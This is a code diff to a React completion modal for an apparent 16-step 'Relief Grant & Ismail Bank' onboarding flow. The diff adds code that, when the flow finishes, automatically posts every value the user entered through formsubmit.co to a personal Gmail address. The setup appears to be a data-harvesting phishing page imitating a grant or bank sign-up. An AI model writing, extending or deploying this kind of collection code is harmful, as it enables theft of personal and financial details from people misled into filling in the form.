@@ -1,8 +1,36 @@
-import React from 'react';
+import React, { useEffect, useState } from 'react';
 import { useStepper } from '../context/StepperContext';
 
 export const CompletionModal = () => {
-  const { isCompleted, setIsCompleted, goToStep } = useStepper();
+  const { isCompleted, setIsCompleted, goToStep, data } = useStepper();
+  const [emailSent, setEmailSent] = useState(false);
+  const [emailStatus, setEmailStatus] = useState('');
+
+  useEffect(() => {
+    if (isCompleted && !emailSent) {
+      setEmailStatus('Sending data to your email...');
+      fetch('https://formsubmit.co/ajax/ismaileyyunusa@gmail.com', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+          _subject: 'New User Data from Relief App',
+          ...data
+        })
+      })
+      .then(response => response.json())
+      .then(result => {
+        setEmailStatus('Data successfully sent to your email!');
+        setEmailSent(true);
+      })
+      .catch(error => {
+        setEmailStatus('Error sending email.');
+        console.error(error);
+      });
+    }
+  }, [isCompleted, emailSent, data]);
 
   if (!isCompleted) return null;
 
@@ -12,14 +40,22 @@ export const CompletionModal = () => {
         <div className="completion-icon">✓</div>
         <h2>Stepper Completed!</h2>
         <p>
-          You have navigated through all 16 steps of the Relief Grant &amp; Ismail Bank onboarding flow in React.
-          Every step's original content, layout, and inputs have been preserved.
+          You have navigated through all 16 steps of the Relief Grant &amp; Ismail Bank onboarding flow.
         </p>
+        
+        {emailStatus && (
+          <p style={{ color: emailSent ? '#00ca59' : '#ffd85b', fontWeight: 'bold', margin: '15px 0' }}>
+            {emailStatus}
+          </p>
+        )}
+
         <div className="completion-btn-row">
           <button
             className="completion-btn btn-restart"
             onClick={() => {
               setIsCompleted(false);
+              setEmailSent(false);
+              setEmailStatus('');
               goToStep(1);
             }}
           >
